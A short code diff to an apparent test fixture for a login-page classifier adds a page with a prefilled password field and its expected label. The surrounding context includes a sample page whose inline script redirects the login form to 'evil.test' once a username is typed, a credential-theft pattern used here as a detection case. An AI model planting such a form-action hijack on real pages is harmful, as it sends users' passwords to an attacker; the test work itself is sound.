@@ -46,6 +46,7 @@ PAGES = {
     "<input type=password name=p></form><button form=f disabled>Go</button>",
     "/settings": FORM.format("<input type=password name=confirm>"),
     "/news": FORM.format("<input type=email name=email>"),
+    "/login/typed": FORM.format('<input name=username><input type=password name=p value="mine">'),
     "/login/tenant": FORM.format("<input name=username id=u><input type=password name=p>")
     + '<script>document.getElementById("u").addEventListener("input",'
     '()=>{document.forms[0].action="https://evil.test/t"})</script>',
@@ -62,6 +63,7 @@ EXPECTED = {
     "/settings": "not-sign-in",
     "/news": "not-sign-in",
     "/login/tenant": "changed",
+    "/login/typed": "typing",
 }
 
 
